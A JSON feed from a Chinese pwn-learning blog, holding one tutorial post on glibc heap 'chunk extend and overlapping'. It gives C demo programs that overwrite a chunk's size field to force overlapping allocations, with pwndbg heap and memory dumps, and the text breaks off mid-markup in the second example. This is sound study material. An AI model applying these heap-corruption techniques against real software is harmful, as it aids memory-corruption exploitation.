{
    "version": "https://jsonfeed.org/version/1",
    "title": "golden的部落阁 • All posts by \"pwn手的自我修养\" category",
    "description": "golden的部落阁",
    "home_page_url": "http://blog.g01den.top",
    "items": [
        {
            "id": "http://blog.g01den.top/posts/d1a08bca.html",
            "url": "http://blog.g01den.top/posts/d1a08bca.html",
            "title": "pwn学习笔记（12）--Chunk Extend and Overlapping",
            "date_published": "2024-11-11T11:51:40.000Z",
            "content_html": "<h1 id=\"pwn学习笔记12chunk-extend-and-overlapping\"><a class=\"markdownIt-Anchor\" href=\"#pwn学习笔记12chunk-extend-and-overlapping\">#</a> pwn 学习笔记（12）–Chunk Extend and Overlapping</h1>\n<p>​\t\tchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping（块重叠） 的效果。这种利用方法需要以下的时机和条件：</p>\n<ul>\n<li>程序中存在基于堆的漏洞</li>\n<li>漏洞可以控制 chunk header 中的数据</li>\n</ul>\n<h2 id=\"1-对inuse的fastbin进行extend\"><a class=\"markdownIt-Anchor\" href=\"#1-对inuse的fastbin进行extend\">#</a> 1、对 inuse 的 fastbin 进行 extend：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//分配第一个0x10的chunk</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//分配第二个0x10的chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"type\">long</span> <span class=\"type\">long</span> *)((<span class=\"type\">long</span> <span class=\"type\">long</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0x41</span>;<span class=\"comment\">// 修改第一个块的size域</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);<span class=\"comment\">// 实现 extend，控制了第二个块的内容</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先进行两次 malloc，之后看看 heap 的状态：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In file: /mnt/hgfs/sharedict/ChunkExtend/extend.c</span><br><span class=\"line\">    3     void *ptr,*ptr1;</span><br><span class=\"line\">    4 </span><br><span class=\"line\">    5     ptr=malloc(0x10);//分配第一个0x10的chunk</span><br><span class=\"line\">    6     malloc(0x10);//分配第二个0x10的chunk</span><br><span class=\"line\">    7 </span><br><span class=\"line\"> ►  8     *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域</span><br><span class=\"line\">    9 </span><br><span class=\"line\">   10     free(ptr);</span><br><span class=\"line\">   11     ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容</span><br><span class=\"line\">   12     return 0;</span><br><span class=\"line\">   13 &#125;</span><br><span class=\"line\">─────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────</span><br><span class=\"line\">00:0000│ rsp 0x7fffffffde30 —▸ 0x555555758010 ◂— 0x0</span><br><span class=\"line\">01:0008│     0x7fffffffde38 ◂— 0x0</span><br><span class=\"line\">02:0010│ rbp 0x7fffffffde40 —▸ 0x5555555546e0 (__libc_csu_init) ◂— push   r15</span><br><span class=\"line\">03:0018│     0x7fffffffde48 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class=\"line\">04:0020│     0x7fffffffde50 ◂— 0x1</span><br><span class=\"line\">05:0028│     0x7fffffffde58 —▸ 0x7fffffffdf28 —▸ 0x7fffffffe2ac ◂— &#x27;/mnt/hgfs/sharedict/ChunkExtend/test&#x27;</span><br><span class=\"line\">06:0030│     0x7fffffffde60 ◂— 0x1f7ffcca0</span><br><span class=\"line\">07:0038│     0x7fffffffde68 —▸ 0x55555555468a (main) ◂— push   rbp</span><br><span class=\"line\">───────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────</span><br><span class=\"line\"> ► f 0   0x5555555546aa main+32</span><br><span class=\"line\">   f 1   0x7ffff7a2d840 __libc_start_main+240</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758020</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758040</span><br><span class=\"line\">Size: 0x20fc1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t有地址的话，就去读一下两个堆的内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000021\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021\t\t&lt;======Chunk2</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000020fc1\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t下一步开始释放，看一看修改 chunk1 的 size 域大小：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x41</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758040</span><br><span class=\"line\">Size: 0x20fc1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现 chunk2 被修改后增大了的 chunk1 给那占了，heap 里就只有一个 Chunk 了，看看内存：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000041\t\t\t&lt;======原Chunk1</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======原Chunk2</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000020fc1\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t除去 chunk1 的 size 域变化了以外，似乎没有其他变化，但是，逻辑上来说，现在的堆里只有一个 chunk 了，之后 free 掉 chunk1 看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (fastbins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x41</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758040</span><br><span class=\"line\">Size: 0x20fc1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x555555758000 ◂— 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后读取下内存：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000020fc1</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t下一步是重头戏，试想，如果原 chunk1 的 size 域没有真正变化，那么我们进行 malloc 一个 0x30 大小的堆块的时候，就不会分配到这个地址上，而是从 Top Chunk 里拆分，那么事实上是怎么样的呢？实践出真知，看一下吧：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x41</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758040</span><br><span class=\"line\">Size: 0x20fc1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000020fc1\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t显然，Top Chunk 并未被拆分，这里确定了，似乎 malloc (0x30) 得到的堆块是原 Chunk1 的地址，这里说明了，这里的原 chunk1 因为 size 域被修改了之后成为了一个新的更大的堆块，这里也就造成了所谓的堆重叠了，chunk1 因为修改了 size 域后，生成的那个新的 chunk 和 chunk2 部分重叠了，这也就导致了，有的对原 chunk1 的修改可以修改到 chunk2 的地方，如果 chunk2 保留了指针，那就可以对 chunk2 进行伪造，可以结合类似 off by one 和 UAF 形成很多种利用方式。</p>\n<h2 id=\"2-对inuse的smallbin进行extend\"><a class=\"markdownIt-Anchor\" href=\"#2-对inuse的smallbin进行extend\">#</a> 2、对 inuse 的 smallbin 进行 extend：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//gcc -g 2.c</span></span><br><span class=\"line\"><span class=\"comment\">//注意把之前那个a.out给删掉</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>);<span class=\"comment\">//分配第一个 0x80 的chunk1</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//分配第二个 0x10 的chunk2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//防止与top chunk合并</span></span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"type\">long</span> *)((<span class=\"type\">long</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0xb1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先进行三次分配，其中，第三次分配是防止 extend 后，chunk 与 topchunk 进行合并，无需关注。先看看经过三次 malloc 之后的堆空间是啥样的：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758090</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x20f31</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/40gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000091\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk3</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000020f31\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t估摸一下，chunk1 的大小似乎有点大，导致 free 掉的 chunk1 并不会进入 fastbin，而是进入 smallbin，那么修改了 size 域后，原本三个 chunk 在 gdb 里的 heap 指令下依旧少了一个:</p>\n<figure class=\"highlight 